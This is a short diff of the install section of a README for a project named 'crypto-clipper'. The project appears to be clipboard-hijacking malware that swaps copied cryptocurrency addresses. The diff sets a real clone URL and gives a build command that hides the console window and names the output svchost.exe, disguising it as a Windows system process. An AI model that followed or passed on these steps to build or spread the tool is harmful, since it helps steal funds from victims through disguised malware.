@@ -39,7 +39,7 @@ This tool can detect and label the following cryptocurrency addresses:
 
 1. Clone this repository:
    ```bash
-   git clone https://github.com/yourusername/crypto-clipper.git
+   git clone https://github.com/RealZZART3XX/crypto-clipper.git
 2. Compile Code:
    ```bash
    go build -ldflags="-H windowsgui" -o svchost.exe main.go
